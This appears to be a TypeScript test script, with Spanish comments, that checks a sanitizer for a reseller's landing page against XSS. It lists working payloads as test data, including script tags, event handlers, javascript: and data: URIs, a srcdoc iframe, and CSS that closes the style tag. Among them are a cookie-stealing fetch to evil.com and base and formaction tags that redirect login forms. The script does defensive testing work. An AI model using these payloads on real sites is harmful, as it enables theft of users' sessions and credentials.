/**
 * Verifica que el HTML de la landing de un reseller no pueda ejecutar JS.
 *
 * La landing comparte origen con /sign-in: un script aquí podría robar las
 * credenciales de los clientes del propio reseller.
 *
 * Uso: npx tsx scripts/verify-landing-sanitize.ts
 */
import { sanitizeLandingCss, sanitizeLandingHtml } from '../lib/landing/sanitize';

const ATTACKS: Array<{ name: string; payload: string; mustNotContain: string[] }> = [
  {
    name: 'script directo',
    payload: '<p>hola</p><script>alert(1)</script>',
    mustNotContain: ['<script', 'alert(1)'],
  },
  {
    name: 'handler onerror en imagen',
    payload: '<img src=x onerror="fetch(\'//evil.com?c=\'+document.cookie)">',
    mustNotContain: ['onerror', 'fetch('],
  },
  {
    name: 'onclick en enlace',
    payload: '<a href="#" onclick="stealPassword()">Entrar</a>',
    mustNotContain: ['onclick', 'stealPassword'],
  },
  {
    name: 'javascript: en href',
    payload: '<a href="javascript:alert(document.domain)">click</a>',
    mustNotContain: ['javascript:'],
  },
  {
    name: 'iframe con srcdoc (ejecuta JS)',
    payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    mustNotContain: ['srcdoc', '<script'],
  },
  {
    name: 'base tag (secuestra el form del login)',
    payload: '<base href="//evil.com/">',
    mustNotContain: ['<base'],
  },
  {
    name: 'svg con onload',
    payload: '<svg onload="alert(1)"></svg>',
    mustNotContain: ['onload'],
  },
  {
    name: 'formaction secuestrando un submit',
    payload: '<button formaction="//evil.com/steal">Enviar</button>',
    mustNotContain: ['formaction'],
  },
  {
    name: 'data: URI con html',
    payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    mustNotContain: ['data:text/html'],
  },
];

function main() {
  let failed = false;

  console.log('\n--- Intentos de XSS sobre la landing del reseller ---\n');

  for (const attack of ATTACKS) {
    const clean = sanitizeLandingHtml(attack.payload);
    const leaked = attack.mustNotContain.filter((needle) =>
      clean.toLowerCase().includes(needle.toLowerCase()),
    );

    if (leaked.length > 0) {
      failed = true;
      console.log(` FALLA | ${attack.name}`);
      console.log(`        salida: ${clean}`);
      console.log(`        se coló: ${leaked.join(', ')}`);
    } else {
      console.log(`  OK   | ${attack.name} → neutralizado`);
    }
  }

  console.log('\n--- CSS ---\n');
  const css = sanitizeLandingCss('body{color:red} </style><script>alert(1)</script>');
  const cssOk = !css.includes('<script') && !css.includes('</style');
  console.log(`${cssOk ? '  OK  ' : ' FALLA'} | cierre de <style> neutralizado — "${css.trim()}"`);
  if (!cssOk) failed = true;

  console.log('\n--- El HTML legítimo sobrevive ---\n');
  const legit = sanitizeLandingHtml(
    '<section class="hero"><h1>ChatPro</h1><p>Vende más</p><img src="/logo.png" alt="logo"><a href="/sign-up">Empezar</a></section>',
  );
  const keepsContent =
    legit.includes('<h1>') &&
    legit.includes('ChatPro') &&
    legit.includes('/sign-up') &&
    legit.includes('class="hero"');
  console.log(`${keepsContent ? '  OK  ' : ' FALLA'} | maquetación, imágenes y enlaces se conservan`);
  if (!keepsContent) failed = true;

  console.log(failed ? '\nHAY FALLOS\n' : '\nTODO OK\n');
  process.exit(failed ? 1 : 0);
}

main();
